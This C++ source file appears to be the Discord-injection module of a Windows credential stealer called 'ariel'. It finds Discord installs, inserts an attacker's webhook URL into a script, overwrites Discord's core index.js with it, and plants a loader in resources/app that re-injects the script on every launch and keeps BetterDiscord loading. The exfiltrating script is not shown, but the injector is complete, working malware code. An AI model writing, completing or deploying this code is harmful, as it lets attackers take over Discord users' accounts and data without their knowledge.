#include "injection.hpp"

#include "util.hpp"

#include <windows.h>

#include <algorithm>
#include <string_view>
#include <system_error>
#include <vector>

namespace ariel::injection {

namespace {

std::string js_escape(std::string_view value) {
    std::string out;
    out.reserve(value.size() + 8);
    for (const char c : value) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"': out += "\\\""; break;
            case '\'': out += "\\'"; break;
            case '\r': out += "\\r"; break;
            case '\n': out += "\\n"; break;
            case '\t': out += "\\t"; break;
            default: out += c; break;
        }
    }
    return out;
}

std::string js_path(const util::fs::path& path) {
    return js_escape(util::to_utf8(path.generic_wstring()));
}

void replace_all(std::string& value, std::string_view from, std::string_view to) {
    if (from.empty()) return;
    size_t position = 0;
    while ((position = value.find(from, position)) != std::string::npos) {
        value.replace(position, from.size(), to);
        position += to.size();
    }
}

bool starts_with(const std::string& value, const std::string& prefix) {
    if (value.size() < prefix.size()) return false;
    const auto beginning = util::lower(std::string_view(value).substr(0, prefix.size()));
    return beginning == util::lower(prefix);
}

std::vector<util::fs::path> core_indexes(const util::fs::path& app_dir) {
    std::vector<util::fs::path> found;
    std::error_code error;
    const auto modules = app_dir / "modules";
    if (!util::fs::is_directory(modules, error)) return found;

    for (const auto& entry : util::fs::directory_iterator(modules, error)) {
        if (!entry.is_directory(error)) continue;
        const auto name = entry.path().filename().string();
        if (!starts_with(name, "discord_desktop_core-")) continue;

        const auto candidates = {
            entry.path() / "discord_desktop_core" / "index.js",
            entry.path() / "index.js",
        };
        for (const auto& candidate : candidates) {
            if (util::fs::is_regular_file(candidate, error)) found.push_back(candidate);
        }
    }
    return found;
}

std::string loader_for(const util::fs::path& inject,
                       const util::fs::path& core,
                       const util::fs::path& backup,
                       const util::fs::path& app_asar) {
    return "const fs=require('fs'),path=require('path');\n"
           "const inject='" + js_path(inject) + "';\n"
           "const core='" + js_path(core) + "';\n"
           "const backup='" + js_path(backup) + "';\n"
           "try{if(!fs.existsSync(backup)&&fs.existsSync(core))fs.copyFileSync(core,backup);}catch(e){}\n"
           "try{const data=fs.readFileSync(inject,'utf8');"
           "if(!fs.existsSync(core)||fs.readFileSync(core,'utf8')!==data)fs.writeFileSync(core,data);}catch(e){}\n"
           "require('" + js_path(app_asar) + "');\n"
           "const bd=path.join(process.env.APPDATA||'','betterdiscord','data','betterdiscord.asar');\n"
           "if(fs.existsSync(bd)){try{require(bd);}catch(e){}}\n";
}

}  // namespace

bool install(const std::string& webhook, const std::string& script, std::string& error) {
    if (script.empty()) {
        error = "injection script missing";
        return false;
    }
    if (webhook.empty()) {
        error = "webhook required for discord injection";
        return false;
    }

    const auto local = util::environment(L"LOCALAPPDATA");
    if (local.empty()) {
        error = "LOCALAPPDATA unavailable";
        return false;
    }

    std::error_code filesystem_error;
    const auto discord_root = util::fs::path(local) / "Discord";
    if (!util::fs::is_directory(discord_root, filesystem_error)) {
        error = "discord install not found";
        return false;
    }

    std::string prepared = script;
    replace_all(prepared, "__ARIEL_WEBHOOK__", js_escape(webhook));

    int patched = 0;
    std::string last_error;
    for (const auto& entry : util::fs::directory_iterator(discord_root, filesystem_error)) {
        if (!entry.is_directory(filesystem_error)) continue;
        const auto name = entry.path().filename().string();
        if (!starts_with(name, "app-")) continue;

        const auto resources = entry.path() / "resources";
        const auto app_asar = resources / "app.asar";
        if (!util::fs::is_regular_file(app_asar, filesystem_error)) continue;

        const auto cores = core_indexes(entry.path());
        if (cores.empty()) continue;

        const auto app_folder = resources / "app";
        util::fs::create_directories(app_folder, filesystem_error);
        if (filesystem_error) {
            last_error = "app folder failed";
            continue;
        }

        for (const auto& core : cores) {
            const auto core_dir = core.parent_path();
            const auto inject_path = core_dir / "index.js.ariel.js";
            const auto backup = core_dir / "index.js.ariel.bak";

            if (!util::write_text(inject_path, prepared)) {
                last_error = "injection write failed";
                continue;
            }
            if (util::fs::is_regular_file(core, filesystem_error) &&
                !util::fs::exists(backup, filesystem_error)) {
                util::fs::copy_file(core, backup, filesystem_error);
            }
            util::write_text(core, prepared);
            util::write_text(app_folder / "package.json",
                             "{\"name\":\"discord\",\"main\":\"index.js\",\"private\":true}\n");
            util::write_text(app_folder / "index.js",
                             loader_for(inject_path, core, backup, app_asar));
            ++patched;
        }
    }

    if (patched == 0) {
        error = last_error.empty() ? "discord install not found" : last_error;
        return false;
    }
    return true;
}

}  // namespace ariel::injection
